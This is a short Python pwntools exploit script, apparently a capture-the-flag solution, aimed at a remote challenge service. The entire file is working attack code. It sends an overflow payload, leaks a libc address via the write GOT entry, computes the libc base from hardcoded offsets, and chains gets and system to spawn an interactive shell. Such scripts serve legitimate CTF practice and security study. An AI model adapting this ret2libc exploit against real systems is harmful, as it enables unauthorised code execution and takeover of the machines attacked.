#!/usr/bin/env python

from pwn import *

# r = remote('127.0.0.1', 8888)
r = remote('csie.ctf.tw', 10114)

main = 0x0804855c
write_plt = 0x080483e0
write_got = 0x0804a020
puts_plt = 0x08048420
puts_got = 0x0804a018

puts_off = 0x65650     # Ubuntu 14.04.2 /lib/i386-linux-gnu/libc.so.6
write_off = 0xd9da0
system_off = 0x40190
gets_off = 0x64cd0

r.send('A'*103 +
    p32(0x0804866b) +
    p32(main) +
    p32(write_got) + '\n')

#r.send('A'*116 +
#    p32(puts_plt) + p32(main) + p32(puts_got) + '\n')

base = u32(r.recvline()[:4]) - write_off

print 'libc base =', hex(base)

system = base + system_off
gets = base + gets_off

r.send('A'*124 +
    p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')

r.interactive()
